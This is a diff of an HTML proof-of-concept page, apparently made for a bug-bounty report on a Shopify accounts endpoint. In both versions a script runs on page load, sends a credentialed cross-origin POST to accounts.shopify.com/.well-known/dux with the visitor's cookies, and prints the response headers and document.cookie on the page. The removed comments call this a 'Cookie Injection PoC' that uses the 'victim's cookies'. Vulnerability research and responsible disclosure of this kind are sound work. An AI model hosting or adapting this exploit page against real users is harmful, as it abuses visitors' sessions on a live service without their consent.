@@ -1,30 +1,33 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Shopify CORS + Cookie Injection PoC</h1>
+<h1>Testing Shopify Cookie Injection...</h1>
+<pre id="output">Waiting...</pre>
 <script>
 (async () => {
-    // Step 1 — Trigger Shopify vulnerable endpoint
-    await fetch("https://accounts.shopify.com/.well-known/dux", {
-        method: "POST",
-        credentials: "include", // include victim's cookies
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            multiTrackToken: "test",
-            sessionToken: "test",
-            enableActiveConsent: false,
-            enableProtoEventForwarding: false,
-            events: []
-        })
-    });
+    try {
+        const response = await fetch("https://accounts.shopify.com/.well-known/dux", {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                multiTrackToken: "test",
+                sessionToken: "test",
+                enableActiveConsent: false,
+                enableProtoEventForwarding: false,
+                events: []
+            })
+        });
 
-    // Step 2 — Read cookies now set for your GitHub Pages domain
-    const cookies = document.cookie;
-
-    // Step 3 — Display cookies on the page (safe for bug bounty)
-    document.body.innerHTML = "<h2>Injected Cookies:</h2><pre>" + cookies + "</pre>";
+        document.getElementById("output").textContent =
+            "Status: " + response.status + "\n" +
+            "Headers: \n" + Array.from(response.headers.entries()).map(e => e.join(": ")).join("\n") +
+            "\n\nCookies now set for this domain:\n" + document.cookie;
+    } catch (err) {
+        document.getElementById("output").textContent = "Error: " + err;
+    }
 })();
 </script>
 </body>
